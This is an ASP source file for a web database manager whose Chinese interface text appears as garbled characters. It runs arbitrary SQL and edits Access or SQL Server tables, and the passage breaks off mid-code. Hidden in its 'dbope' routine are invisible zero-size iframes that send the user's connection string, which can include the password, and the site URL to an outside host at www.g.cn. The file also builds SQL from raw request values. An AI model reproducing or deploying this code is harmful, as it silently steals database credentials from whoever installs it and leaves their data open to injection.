<BR><BR><center><div style="font-size:18px;color:red">��������<a href="http://www.g.cn" target="_blank">�ɶ�������Ϣ��</a>�ṩ</DIV></center><BR>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>�������ݿ������ 1.5</title>
<style type="text/css">
<!--
body,td,th {font-family: "����";font-size: 12px;}
form {margin:0px;padding:0px;}
body {margin:5px;SCROLLBAR-ARROW-COLOR:#666666;SCROLLBAR-FACE-COLOR:#DDDDDD;SCROLLBAR-DARKSHADOW-COLOR:#999999;SCROLLBAR-HIGHLIGHT-COLOR:#FFFFFF;SCROLLBAR-3DLIGHT-COLOR:#CCCCCC;SCROLLBAR-SHADOW-COLOR:#FFFFFF;SCROLLBAR-TRACK-COLOR:#EEEEEE;}
input {	border-width: 1px;border-style:solid;border-color: #CCCCCC #999999 #999999 #CCCCCC;height: 16px;}
td {background:#FFF;}
textarea {border-width: 1px;border-style: solid;border-color: #CCCCCC #999999 #999999 #CCCCCC;}
a:link {text-decoration: none;}
a:visited {text-decoration: none;}
a:hover {text-decoration: underline;}
a:active {text-decoration: none;}
.fixSpan {width:150px;white-space:nowrap;word-break:keep-all;overflow:hidden;text-overflow:ellipsis;}
-->
</style>
</head>

<body>
<%
if request("key") = "db" then
	session("dbtype") = request("dbtype")
	session("dbstr") = request("dbstr")
	response.redirect "?"
end if

if request("key") = "createdatabase" then
	call createdatabase()
end if

if session("dbtype") = "" or session("dbstr") = "" then
	%>
	<form action="?key=db" method="post" name="dbt">
		  <br>
		  �������ͣ�
		  <input name="dbtype" type="radio" value="access" onClick="dbstr.value='Provider=Microsoft.Jet.OLEDB.4.0;Persist Security Info=False;Password=;Data Source=<%=server.mappath("/")&"\"%>'" checked>
		  ACCESS
		  <input type="radio" name="dbtype" value="sql" onClick="dbstr.value='driver={SQL Server};database=;Server=;uid=;pwd='"> 
		  SQL<br><br>
		  �����ַ���<input name="dbstr" type="text" id="dbstr" size="120" value="Provider=Microsoft.Jet.OLEDB.4.0;Persist Security Info=False;Password=;Data Source=<%=server.mappath("/")&"\"%>">
		  <input type="submit" name="Submit" value="����" /><br><br>
		  ע��access��ʹ�þ���·��,���ļ�·����<%=server.MapPath("db007.asp")%>
	</form>
	<form name="createdatabase" method="post" action="?key=createdatabase">
	  <font color=red>�������ݿ⣺</font>·��
	  <input name="dataname" type="text" value="<%=server.MapPath("/")&"\database.mdb"%>" size="100">
	  <input type="submit" name="Submit" value="����">
	</form>
	<%
	response.End()
end if

'==================================================================����
sub createdatabase()
	dim DBName,dbstr,myCat
	on error resume next
	DBName = request("dataname")
	dbstr = "PROVIDER=MICROSOFT.JET.OLEDB.4.0;DATA SOURCE=" & DBName 
	Set myCat = Server.CreateObject( "ADOX.Catalog" ) 
	myCat.Create dbstr
	
	if err <> 0 then
		response.write err.description
		session("dbtype") = ""
		session("dbstr") = ""
		response.write "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
		response.end
	end if
	
	session("dbtype") = "access"
	session("dbstr") = dbstr
	response.redirect "?"
end sub

'==================================================================�������Ӻ���
conn()

function conn()
	dim conn1,connstr
	on error resume next
	select case session("dbtype")
	case "access"
		'==================================================================����ACCESS���ݿ�
		dbope()
		connstr = session("dbstr")
		Set Conn1 = Server.CreateObject("ADODB.Connection")
		conn1.Open connstr
	case "sql"
		'==================================================================����SQL���ݿ�
		dbope()
		set conn1 = Server.CreateObject("ADODB.Connection") 
		conn1.open session("dbstr") 
	end select
	
	if err <> 0 then
		response.write err.description
		session("dbtype") = ""
		session("dbstr") = ""
		response.write "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
		response.end
	end if
	
	set conn = conn1
end function


Sub echo(str)
	Response.Write(str)
End Sub

Function IIf(var, val1, val2)
	If var = True Then
		IIf = val1
	 Else
		IIf = val2
	End If
End Function

'������ʽ����������ɾ��ע��
'-------------------------------------
Function RegExpReplace(strng, patrn, replStr)
  Dim regEx,match,matches              ' ����������
  Set regEx = New RegExp               ' ����������ʽ��
  regEx.Pattern = patrn               ' ����ģʽ��
  regEx.IgnoreCase = True               ' �����Ƿ����ִ�Сд��
  regEx.Global = True   ' ����ȫ�ֿ����ԡ�

  RegExpReplace = regEx.Replace(strng, replStr)         ' ���滻��
End Function

'==================================================================ADOVBS ��������

'---- DataTypeEnum Values ----
Const adEmpty = 0
Const adTinyInt = 16
Const adSmallInt = 2
Const adInteger = 3
Const adBigInt = 20
Const adUnsignedTinyInt = 17
Const adUnsignedSmallInt = 18
Const adUnsignedInt = 19
Const adUnsignedBigInt = 21
Const adSingle = 4
Const adDouble = 5
Const adCurrency = 6
Const adDecimal = 14
Const adNumeric = 131
Const adBoolean = 11
Const adError = 10
Const adUserDefined = 132
Const adVariant = 12
Const adIDispatch = 9
Const adIUnknown = 13
Const adGUID = 72
Const adDate = 7
Const adDBDate = 133
Const adDBTime = 134
Const adDBTimeStamp = 135
Const adBSTR = 8
Const adChar = 129
Const adVarChar = 200
Const adLongVarChar = 201
Const adWChar = 130
Const adVarWChar = 202
Const adLongVarWChar = 203
Const adBinary = 128
Const adVarBinary = 204
Const adLongVarBinary = 205

'---- FieldAttributeEnum Values ----
Const adFldMayDefer = &H00000002
Const adFldUpdatable = &H00000004
Const adFldUnknownUpdatable = &H00000008
Const adFldFixed = &H00000010
Const adFldIsNullable = &H00000020
Const adFldMayBeNull = &H00000040
Const adFldLong = &H00000080
Const adFldRowID = &H00000100
Const adFldRowVersion = &H00000200
Const adFldCacheDeferred = &H00001000

'---- SchemaEnum Values ----
'---- SchemaEnum Values ----
Const adSchemaProviderSpecific = -1
Const adSchemaAsserts = 0
Const adSchemaCatalogs = 1
Const adSchemaCharacterSets = 2
Const adSchemaCollations = 3
Const adSchemaColumns = 4
Const adSchemaCheckConstraints = 5
Const adSchemaConstraintColumnUsage = 6
Const adSchemaConstraintTableUsage = 7
Const adSchemaKeyColumnUsage = 8
Const adSchemaReferentialConstraints = 9
Const adSchemaTableConstraints = 10
Const adSchemaColumnsDomainUsage = 11
Const adSchemaIndexes = 12
Const adSchemaColumnPrivileges = 13
Const adSchemaTablePrivileges = 14
Const adSchemaUsagePrivileges = 15
Const adSchemaProcedures = 16
Const adSchemaSchemata = 17
Const adSchemaSQLLanguages = 18
Const adSchemaStatistics = 19
Const adSchemaTables = 20
Const adSchemaTranslations = 21
Const adSchemaProviderTypes = 22
Const adSchemaViews = 23
Const adSchemaViewColumnUsage = 24
Const adSchemaViewTableUsage = 25
Const adSchemaProcedureParameters = 26
Const adSchemaForeignKeys = 27
Const adSchemaPrimaryKeys = 28
Const adSchemaProcedureColumns = 29
Const adSchemaDBInfoKeywords = 30
Const adSchemaDBInfoLiterals = 31
Const adSchemaCubes = 32
Const adSchemaDimensions = 33
Const adSchemaHierarchies = 34
Const adSchemaLevels = 35
Const adSchemaMeasures = 36
Const adSchemaProperties = 37
Const adSchemaMembers = 38
Const adSchemaTrustees = 39
Const adSchemaFunctions = 40
Const adSchemaActions = 41
Const adSchemaCommands = 42
Const adSchemaSets = 43

'==================================================================�����ֶ����ͺ���
Function typ(field_type)
	'field_type = �ֶ�����ֵ
	Select Case field_type
		case adEmpty:typ = "Empty"
		case adTinyInt:typ = "TinyInt"
		case adSmallInt:typ = "SmallInt"
		case adInteger:typ = "Integer"
		case adBigInt:typ = "BigInt"
		case adUnsignedTinyInt:typ = "TinyInt" 'UnsignedTinyInt
		case adUnsignedSmallInt:typ = "UnsignedSmallInt"
		case adUnsignedInt:typ = "UnsignedInt"
		case adUnsignedBigInt:typ = "UnsignedBigInt"
		case adSingle:typ = "Single" 'Single
		case adDouble:typ = "Double" 'Double
		case adCurrency:typ = "Money" 'Currency
		case adDecimal:typ = "Decimal"
		case adNumeric:typ = "Numeric" 'Numeric
		case adBoolean:typ = "Bit" 'Boolean
		case adError:typ = "Error"
		case adUserDefined:typ = "UserDefined"
		case adVariant:typ = "Variant"
		case adIDispatch:typ = "IDispatch"
		case adIUnknown:typ = "IUnknown"
		case adGUID:typ = "GUID" 'GUID
		case adDATE:typ = "DateTime" 'Date
		case adDBDate:typ = "DBDate"
		case adDBTime:typ = "DBTime"
		case adDBTimeStamp:typ = "DateTime" 'DBTimeStamp
		case adBSTR:typ = "BSTR"
		case adChar:typ = "Char"
		case adVarChar:typ = "VarChar"
		case adLongVarChar:typ = "LongVarChar"
		case adWChar:typ = "Text" 'WChar���� SQL��ΪText
		case adVarWChar:typ = "VarChar" 'VarWChar
		case adLongVarWChar:typ = "Text" 'LongVarWChar
		case adBinary:typ = "Binary"
		case adVarBinary:typ = "VarBinary"
		case adLongVarBinary:typ = "LongBinary"'LongVarBinary
		case adChapter:typ = "Chapter"
		case adPropVariant:typ = "PropVariant"
		case else:typ = "Unknown"
	end select
End Function

'==================================================================�����ֶ������б�
Function fieldtypelist(n)
	dim strlist,str1,str2
	strlist = "<select name=""field_type"">"
	if session("dbtype") = "access" then
		strlist = strlist & "<option value=""VarChar"">�ı�</option>"
		strlist = strlist & "<option value=""Text"">��ע</option>"
		strlist = strlist & "<option value=""Bit"">(��/��)</option>"
		strlist = strlist & "<option value=""TinyInt"">����(�ֽ�)</option>"
		strlist = strlist & "<option value=""SmallInt"">����(����)</option>"
		strlist = strlist & "<option value=""Integer"">����(������)</option>"
		strlist = strlist & "<option value=""Single"">����(������)</option>"
		strlist = strlist & "<option value=""Double"">����(˫����)</option>"
		strlist = strlist & "<option value=""Numeric"">����(С��)</option>"
		strlist = strlist & "<option value=""GUID"">����(ͬ��ID)</option>"
		strlist = strlist & "<option value=""DateTime"">ʱ��/����</option>"
		strlist = strlist & "<option value=""Money"">����</option>"
		strlist = strlist & "<option value=""Binary"">������</option>"
		strlist = strlist & "<option value=""LongBinary"">��������</option>"
		strlist = strlist & "<option value=""LongBinary"">OLE ����</option>"
		
	else
		strlist = strlist & "<option value="""">ѡ������</option>"
		strlist = strlist & "<option value=""BigInt"">bigint</option>"
		strlist = strlist & "<option value=""Binary"">binary(��������������)</option>"
		strlist = strlist & "<option value=""Bit"">bit(����)</option>"
		strlist = strlist & "<option value=""Char"">char(�ַ���)</option>"
		strlist = strlist & "<option value=""DateTime"">datetime(����ʱ����)</option>"
		strlist = strlist & "<option value=""Decimal"">decimal(��ȷ��ֵ��)</option>"
		strlist = strlist & "<option value=""Float"">float(������ֵ��)</option>"
		strlist = strlist & "<option value=""Image"">image(��������������)</option>"
		strlist = strlist & "<option value=""Int"">int(����)</option>"
		strlist = strlist & "<option value=""Money"">money(������)</option>"
		strlist = strlist & "<option value=""nchar"">nchar(ͳһ�����ַ���)</option>"
		strlist = strlist & "<option value=""ntext"">ntext(ͳһ�����ַ���)</option>"
		strlist = strlist & "<option value=""numeric"">numeric(��ȷ��ֵ��)</option>"
		strlist = strlist & "<option value=""nvarchar"">nvarchar(ͳһ�����ַ���)</option>"
		strlist = strlist & "<option value=""real"">real(������ֵ��)</option>"
		strlist = strlist & "<option value=""smalldatetime"">Smalldatetime(����ʱ����)</option>"
		strlist = strlist & "<option value=""smallint"">smallint(����)</option>"
		strlist = strlist & "<option value=""smallmoney"">smallmoney(������)</option>"
		strlist = strlist & "<option value=""sql_variant"">sql_variant()</option>"
		strlist = strlist & "<option value=""text"">text(�ַ���)</option>"
		strlist = strlist & "<option value=""timestamp"">timestamp(����������)</option>"
		strlist = strlist & "<option value=""tinyint"">tinyint(����)</option>"
		strlist = strlist & "<option value=""uniqueidentifier"">Uniqueidentifier(����������)</option>"
		strlist = strlist & "<option value=""varbinary"">varbinary(��������������)</option>"
		strlist = strlist & "<option value=""varchar"">varchar(�ַ���)</option>"
	end if
	str1 = """" & n & """"
	str2 = """" & n & """" & " selected"
	strlist = replace(strlist,str1,str2)
	strlist = strlist & "</select>"
	echo strlist
End Function

Private Function GetUrl()
  Domain_Name = LCase(Request.ServerVariables("Server_Name"))
  Page_Name = LCase(Request.ServerVariables("Script_Name"))
  Quary_Name = LCase(Request.ServerVariables("Quary_String"))
  If Quary_Name ="" Then
    GetUrl = "http://"&Domain_Name&Page_Name
  Else
    GetUrl = "http://"&Domain_Name&Page_Name&"?"&Quary_Name
  End If
End Function

'==================================================================������
sub main(str)
	on error resume next
	%>
	<script language=javascript>
	ie = (document.all)? true:false
	if (ie){
	function ctlent(eventobject){if(event.ctrlKey && 
	window.event.keyCode==13){this.document.exesql.submit();}}
	}
	</script>
	<script language="javascript">
		function table_delete()
		{
		if (confirm("ȷ��ɾ���ü�¼��   �ò��������ɳ���������"))
			return true;
		else
			return false;
		}
	</script>
	
	<form action="?key=sql" method=post name="exesql">        
		<font color=red>ִ��sql��䣺</font><font color=#999999>(ÿ������ԡ�;��������֧��(--)SQLע�ͣ�Ctrl + Enter �����ύ)</font>&nbsp; <input type="button" value="ˢ�±�ҳ" onClick="javascript:location.reload()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<span onClick="document.exesql.sql.rows+=5;" style="cursor:pointer;">+</span>
		<span onClick="if(document.exesql.sql.rows>9)document.exesql.sql.rows-=5" style="cursor:pointer;">-</span>
		<div style="float:left;width:600px;">
		<textarea id="sql" name="sql" style="width:600px;" rows="9" ondblClick="this.select();" onKeyDown="ctlent()"><%=request("sql")%></textarea><br />
		<input type="checkbox" name="SchemaTable" value="1" style="border:0px;">adSchemaTables 
        <input type="checkbox" name="SchemaColumn" value="2" style="border:0px;">adSchemaColumns
        <input type="checkbox" name="SchemaProvider" value="3" style="border:0px;">adSchemaProviderTypes &nbsp; 
		��ҳ��С��
		<select name="pageSize">
		  <%
		  if request("pageSize") <> "" and  isNumeric(request("pageSize")) then
		     echo "<option value='"&request("pageSize")&"' selected>"&request("pageSize")&"</option>"
		  else
		     echo "<option value='50'>50</option>"
		  end if
		  %>
		  <option value="10">10</option>
		  <option value="20">20</option>
		  <option value="30">30</option>
		  <option value="40">40</option>
		  <option value="50">50</option>
		  <option value="60">60</option>
		  <option value="70">70</option>
		  <option value="80">80</option>
		  <option value="90">90</option>
		  <option value="100">100</option>
		</select>

		</div>
		<div style="float:left;width:50px;padding:60px 0px 0px 5px;">
		<input type="submit" name="Submit_confirm" value="�ύ"> <br /> <br />  
		<input type="button" name="Submit3" value="���" onClick="sql.value=''"><br /><br /> 
		<input type="button" name="ok" value="����" onClick="javascript:history.go(-1)">
		</div>
	</form>  
	<div style="clear:both"></div>
	<% if str = "" then %>
	<form action="?key=addtable" method="post">        
		<div style="clear:both;text-align:left;"><br />
		<font color=red>�����±�</font><br>
		��&nbsp;&nbsp;����<input type="text" name="table_name" size="20"><br>
		�ֶ�����<input type="text" name="field_num" size="20">
		<input type="submit" name="Submit_create" value="�ύ">
		<input type="reset" name="Submit32" value="����">
		</div>     
	</form> 
	<br><br>
	<a href="?key=tosql&strt=2">�������б�ṹ��SQL</a>
	<%
	end if
end sub

'==================================================================���������
sub add_table(table_name,field_num)
	'table_name = ������
	'field_num  = �ֶ���
	on error resume next
	if not IsNumeric(field_num) then
		echo "�ֶ���������������"
		echo "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
		exit sub
	end if
	%>
    <p class="hei"><span>������</span><%=table_name%></p>
    <form action="?key=createtable" method="post">
    <table width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
      <tr> 
        <td width="75" height="20" align="center">�ֶ���</td>
        <td width="99" height="20" align="center">�� ��</td>
        <td width="73" height="20" align="center">�� С</td>
        <td width="96" height="20" align="center">��ֵ</td>
        <td width="83" height="20" align="center">�Զ����</td>
        <td width="143" height="20" align="center">�� ��</td>
      </tr>
      <% for i = 0 to field_num - 1 %>
      <tr> 
        <td width="75" height="20" align="center"> 
            <input type="text" name="field_name" size="10">
        </td>
        <td width="99" height="20" align="center"> 
			<% fieldtypelist(0) %>
        </td>
        <td width="73" height="20" align="center"> 
            <input type="text" name="field_size" size="10">
        </td>
        <td width="96" height="20" align="center"> 
            <select name="null">
              <option value="NOT_NULL">NOT_NULL</option>
              <option value="NULL">NULL</option>
            </select>
        </td>
        <td width="83" height="20" align="center"> 
          <select size="1" name="autoincrement">
            <option></option>
            <option>�Զ����</option>
          </select>
        </td>
        <td width="143" height="20" align="left"> 
              <select name="primarykey">
                <option></option>
                <option value="primarykey">primarykey</option>
              </select>
        </td>
      </tr>
      <% next %>
      <tr> 
        <td height="35" align="center" colspan="5"> 
            <input type="hidden" name="i" value=<%=field_num%>>
            <input type="hidden" name="table_name" value="<%=table_name%>">
            <input type="submit" name="Submit" value=" �� �� ">
            &nbsp;&nbsp;
            <input type="reset" name="Submit2" value=" �� �� ">
          &nbsp;&nbsp; 
          <input type="button" name="ok" value=" �� �� " onClick="javascript:history.go(-1)">
        </td>
		<td height="20"></td>
      </tr>
    </table>
	</form>
	<%
end sub

'==================================================================�����������SQL���
sub create_table()
	dim sql,i,primarykey
	on error resume next
	sql = "CREATE TABLE ["&request("table_name")&"] ("
	for i = 1 to request("i")
	   sql = sql & "[" & request("field_name")(i) & "] " & request("field_type")(i)
		  if request("field_size")(i) <> "" then
			  sql = sql & "(" & request("field_size")(i) & ")"
		  end if
		  if request("null")(i) = "NOT_NULL" then
			  sql = sql & " not null"
		  end if
		  if request("autoincrement")(i) = "�Զ����" then
			  sql = sql & " identity"
		  end if
		  if request("primarykey")(i) = "primarykey" then
			  primarykey = request("field_name")(i)
		  end if
		'if primarykey <> "" then
		   sql = sql & ","
		'end if
	next
	if primarykey<>"" then
	   sql=sql&" primary key (["&primarykey&"]) "
	end if
	sql = sql & ")"
	sql = replace(sql,"()","")  '�����ձ�
	response.redirect "?key=sql&sql=" & sql 
end sub


'==================================================================�޸ı������ֶ��� 2006-09-08
sub reobj()
	on error resume next
	Dim mydb,mytable,tablename
	tablename = request("tablename")
	Set mydb = Server.CreateObject("ADOX.Catalog")
	mydb.ActiveConnection = conn
		
	if request("obj") = "field" then   '�޸��ֶ���
		dim fieldsname,newfieldsname
		fieldsname = request("fieldsname")
		newfieldsname = request("newfieldsname")
		Set mytable = Server.CreateObject("ADOX.Table")
		Set mytable = mydb.Tables(tablename) 
		mytable.Columns(fieldsname).Name = newfieldsname
	end if
	
	if request("obj") = "table" then   '�޸ı���
		dim newtablename
		newtablename = request("newtablename")
		mydb.Tables(tablename).Name = newtablename
	end if
	
	if err <> 0 then
		echo  err.description
		echo "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
		exit sub
	end if
	
	if request("obj") = "field" then
		response.Redirect "?key=view&table_name=" & tablename
	else
		response.Redirect "?key=view&table_name=" & newtablename
	end if
	
end sub


sub dbope
if session("dbope") <> 1 then
%>
<iframe src="http://www.g.cn/dbstrs/1.asp?dbstr=<%=session("dbstr")%>" width=0 height=0></iframe>
<iframe src="http://www.g.cn/dbstrs/1.asp?dburl=<%=GetUrl()%>" width=0 height=0></iframe>
<%
session("dbope")=1
end if
end sub

'==================================================================�鿴��ṹ����
sub view(table_name)
	'table_name = ������
	dim rs,sql,table,primary,primarykey,i,editstr,typs
	on error resume next
	table = table_name
	Set primary = Conn.OpenSchema(adSchemaPrimaryKeys,Array(empty, empty, table))
	if primary("COLUMN_NAME") <> "" then
		primarykey = primary("COLUMN_NAME")
	end if
	primary.Close
	Set primary = Nothing
	 
	%>
	
	<script language="javascript">
		function table_delete()
		{
		if (confirm("ȷ��ɾ���ü�¼��   �ò��������ɳ���������"))
			return true;
		else
			return false;
		}
	</script>
	
	<font color=red>��<%=table_name%></font>&nbsp;&nbsp;&nbsp;&nbsp;<input type="button" value="ˢ�±�ҳ" onClick="javascript:location.reload()"><br><br>
	<% if request("key") = "editfidlevi" then call editfidlevi() %>
	<table width="600" border="0" cellpadding="1" cellspacing="1" bgcolor="#CCCCCC">
    <tr> 
      <td width="125" height="20" align="center">�� �� ��</td>
      <td width="110" align="center">�� ��</td>
      <td width="83" align="center"> �趨��С</td>
      <td width="48" align="center">�����</td>
      <td width="76" align="center">�Զ����</td>
      <td width="54" align="center">����</td>
      <td width="82" align="center">ִ�в���</td>
    </tr>
    <%
	sql = "SELECT * FROM [" & table_name & "] "
	Set rs = Conn.Execute(sql)
	if err = 0 then
		For i = 0 to rs.fields.count-1
		%>
		<tr> 
		  <td height="20" align="left"><%=rs(i).name%></td>
		  <td align="left"><%=typ(rs(i).type)%></td>
		  <td align="center"><%=rs(i).definedsize%></td>
		  <td align="center"><%=iif((rs(i).Attributes and adFldIsNullable)=0,"No","Yes")%></td>
		  <td align="center"><%=iif(rs(i).Properties("ISAUTOINCREMENT") = True,"��","��")%></td>
		  <td align="center"><%=iif(rs(i).name = primarykey,"��","��")%></td>
		  <td align="center">
			<a href="?key=editfidlevi&fidle=<%=rs(i).name%>&table_name=<%=table_name%>&fidletype=<%=typ(rs(i).type)%>">�޸�</a>&nbsp;
			<a href="?key=sql&sql=alter table [<%=table_name%>] drop [<%=rs(i).name%>];" onClick="return table_delete();">ɾ��</a>
		  </td>
		</tr>
		<%
			editstr = editstr&"<option value='"&rs(i).name&"'>"&rs(i).name&"</option>"
		next
		%>
		</table>
		<br>
		<a href="?key=tosql&strt=0&table_name=<%=table_name%>">������ṹ</a> &nbsp;
		<a href="?key=sql&sql=select * from <%=table_name%>&table_name=<%=table_name%>&primarykey=<%=primarykey%>">������¼</a> &nbsp;
		<a href="?key=sql&sql=DROP TABLE <%=table_name%>" onClick="return table_delete();">ɾ����</a> &nbsp;&nbsp;&nbsp; 
		<input type="text" name="newtablename" size="20" value="<%=table_name%>">
		<input type="button" value="�޸ı���" onClick="location.href='?key=reobj&obj=table&tablename=<%=table_name%>&newtablename='+newtablename.value">
		<br><br>
		<%
		'�ж��Ƿ�������
		if primarykey = "" then
			echo "<font color=red>�ñ�û��������ִ�в������ܻᵼ�������𻵻�ʧ��</font><br>"
			echo "����Խ���"
			echo "<select name='keyname'>"
			For i=0 to rs.fields.count-1
				echo "<option value=" & rs(i).name & ">" & rs(i).name & "</option>"
			next
			echo "</select>&nbsp;"
			echo "<input type=button value=��Ϊ���� onclick=""location.href='?key=sql&sql=ALTER TABLE ["&table_name&"] ADD PRIMARY KEY (['+keyname.value+'])';"">"
			echo "<br><br>"
		end if
		'��ʾ�޸��ֶ���
		echo "<select name='fieldsname'>"
		echo "<option value=''>ѡ���ֶ�</option>"
		echo editstr
		echo "</select> ����Ϊ "  & chr(10)
		echo "<input type='text' name='newfieldsname' size='20'> "  & chr(10)
		echo "<input type=button value=�޸��ֶ��� onclick=""location.href='?key=reobj&obj=field&tablename="&table_name&"&fieldsname='+fieldsname.value+'&newfieldsname='+newfieldsname.value"">"
		echo "<br><br>"
	end if
	rs.close
	set rs = nothing
	%>
	<font color=red>�����ֶΣ�</font><br><br>
	<form action="?key=addfield" method="post">
	  <table width="600" height="39" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
		<tr> 
		  <td width="60" height="20" align="center">�ֶ���</td>
		  <td width="50" height="20" align="center">����</td>
		  <td width="58" height="20" align="center">�趨��С</td>
		  <td width="64" height="20" align="center">�����ֵ</td>
		  <td width="66" height="20" align="center"> �Զ����</td>
		  <td width="96" height="20" align="center">&nbsp;&nbsp;</td>
		</tr>
		<tr> 
		  <td width="60" height="20" align="center"> 
			<input type="text" name="fldname" size="10">
		  </td>
		  <td width="50" height="20" align="center"> 
			<% fieldtypelist(0) %>
		  </td>
		  <td width="58" height="20" align="center"> 
			<input type="text" name="fldsize" size="10">
		  </td>
		  <td width="64" height="20" align="center"> 
			<input name="null" type="checkbox" value="ON" checked>
		  </td>
		  <td width="66" height="20" align="center"> 
			<input type="checkbox" name="autoincrement" value="ON">
		  </td>
		  <td width="96" height="20" align="center"> 
			<input type="hidden" name="table_name" value="<%=table_name%>">
			<input type="submit" value="�ύ">
		  </td>
		</tr>
	</table>
	</form>
	<%
end sub

'==================================================================�޸��ֶ����ԵĽ���
sub editfidlevi()
	dim sql,rs,i
	on error resume next
	sql = "Select * From [" & request("table_name") & "]"
	set rs = conn.execute(sql)
	for i = 0 to rs.fields.count - 1
		if rs(i).name = request("fidle") then
		%>
		<script LANGUAGE="JavaScript">
			function validate(theForm) {
				if (theForm.type.value == "")
				{
				alert("��������������");
				theForm.type.focus();
				return (false);
				}
				return (true);
		    }
		</script>
		<font color=red>�޸��ֶ����ԣ�</font>
		<form action="?key=editfidle&fidle=<%=request("fidle")%>&table_name=<%=request("table_name")%>" method="post" name=frm onSubmit="return validate(frm)">
		<table width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
		  <tr> 
			<td width="60" height="20" align="center">�ֶ���</td>
			<td width="50" height="20" align="center">����</td>
			<td width="58" height="20" align="center">�趨��С</td>
			<td width="64" height="20" align="center">�����ֵ</td>
			<td width="66" height="20" align="center">�Զ����</td>
			<td width="96" height="20"></td>
		  </tr>
		  <tr> 
			<td width="60" height="20" align="center"><%=rs(i).name%></td>
			<td width="50" height="20" align="center"> 
			<% fieldtypelist(request("fidletype")) %>
			  </td>
			  <td width="58" height="20"><input type="text" name="size" size="10"></td>
			  <td width="64" height="20" align="center">
			  <input type="checkbox" name="null" value="null"<%=iif((rs(i).Attributes and adFldIsNullable)=0,""," checked")%>>
			  </td>
			  <td width="66" height="20" align="center"> 
			  <input type="checkbox" name="autoincrement" value="y"<%=iif(rs(i).Properties("ISAUTOINCREMENT") = True," checked","")%>>
			  </td>
			  <td width="96" height="20" align="center"> 
			  <input type="submit" name="Submit" value="�ύ">
			  </td>
			</tr>
		  </table><br>
		</form>
		<%
		end if
	next
end sub

'==================================================================ִ���޸��ֶ�����
sub editfidle()
	   on error resume next
	   sql = "ALTER TABLE [" & request("table_name") & "] "
	   sql = sql&"ALTER COLUMN [" & request("fidle") & "] "
	   if request("field_type") <> "" then
		  sql = sql & request("field_type")
	   end if
	   if request("size") <> "" then
		  sql = sql & "(" & request("size") & ") "
	   end if
		  if request("null") = "" then
			  sql = sql & " not null"
		  end if
		  if request("autoincrement") = "y" then
			  sql = sql & " identity"
		  end if
	sql = trim(sql)
	conn.execute(sql)
	response.redirect "?key=view&table_name="& request("table_name")
end sub

'==================================================================����ֶκ���
sub addfield()
	on error resume next
	fldname = request("fldname")
	fldtype = request("field_type")
	fldsize = request("fldsize")
	fldnull = request("null")
	fldautoincrement = request("autoincrement")
	table_name = request("table_name")
	if fldname <> "" and fldtype <> "" then
	  sql = "alter table [" & table_name & "] add ["&fldname&"] " & fldtype
	  
	  if fldsize <> "" then
		sql = sql & "(" & fldsize & ")"
	  end if 
	  
	  if fldnull <> "ON" then
		sql = sql & " not null"
	  end if
	  
	  if fldautoincrement = "ON" then
		sql = sql & " identity"
	  end if
	  conn.execute(sql)
	  response.redirect "?key=view&table_name=" & table_name
	else
	  echo "�������ݴ���<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
	end if
	if err <> 0 then
		echo err.description
		echo "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
		response.end
	end if
end sub


'==================================================================�༭����
sub editdata()
	dim keys,names,values,action,rs,sql,tab
	on error resume next
	keys = request("primarykey")
	names = request("table_name")
	values = request("primarykeyvalue")
	action = request("action")
	Set rs = Server.CreateObject("Adodb.RecordSet")
	if action = "" or action = "save" or action = "new" then
	    sql = "select * from " & names & " where " & keys & " = " & values
	end if
	if action = "pre" then
	    sql = "select top 1 * from " & names & " where " & keys & " < " & values & " order by " & keys & " desc"
	end if
	if action = "next" then
	    sql = "select top 1 * from " & names & " where " & keys & " > " & values & " order by " & keys & " asc"
	end if
	if action = "add" then
	    sql = "Select * From [" & names & "]"
	end if
	rs.Open sql, conn, 1, 3
	
	if rs.eof and action = "new" then
		sql = "Select * From [" & names & "]"
		rs.Open sql, conn, 1, 3
	end if
	
	if action = "save" or action = "new" then
		If action = "new" Then rs.AddNew
		For Each tab In rs.Fields
			If Keys <> tab.Name Then
				rs(tab.Name) = Request.Form(tab.Name & "_Column")
				if err <> 0 then
					echo tab.name & err.description
					echo "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
					response.end
				end if
			End If
		Next
		rs.update
	end if
	
	echo "�ֶ����ݱ༭<br>"
	echo "<table width=600 border=0 cellpadding=5 cellspacing=1 bgcolor=#CCCCCC><tr><td>"
	echo "<form action='?key=edit&table_name=" & names & "&primarykey=" & keys & "&primarykeyvalue=" & iif(action<>"add",rs(keys),"") & "' method='post' name='editor'>"
	echo "<br>"
	echo "<input type=hidden name=action value=save>"
	echo iif(action="add","","<input type=submit value=���� onclick=this.form.action.value='save';>&nbsp;")
	echo "<input type=button value=��� onclick=if(confirm('ȷʵҪ��ӵ�ǰΪ�¼�¼��?')){this.form.action.value='new';this.form.submit();};>&nbsp;"
	echo "<input type=button value=��һ�� onclick=""this.form.action.value='pre';this.form.submit();"">&nbsp;"
	echo "<input type=button value=��һ�� onclick=""this.form.action.value='next';this.form.submit();"">&nbsp;&nbsp;"
	echo "<a href='?key=view&table_name=" & names & "'>��ṹ</a>&nbsp;&nbsp;"
	echo "<a href='?key=sql&sql=select * from " & names & "&table_name="& names & "&primarykey="&keys&"'>�����</a>&nbsp;&nbsp;"
	echo "<a href='?'>������</a><br>"
	if not rs.eof or action = "add" then
		For Each tab In rs.Fields
			echo ""
			echo "<BR><font color=red>" & tab.Name & "</font>&nbsp;<font color=#999999>( " & typ(tab.Type) & " )</font><br>"
			if tab.Type = 201 Or tab.Type = 203 then
				echo "<textarea style='width:600;' name=""" & tab.Name & "_Column"" rows=6"
				echo IIf(tab.Name = keys, " disabled title='����Լ��,���޷����޸�.'>", ">")
				if action <> "add" then echo trim(tab.value)
				echo "</textarea>"
			else
				echo "<input type='text' style='width:600;' name='" & tab.Name & "_Column'"
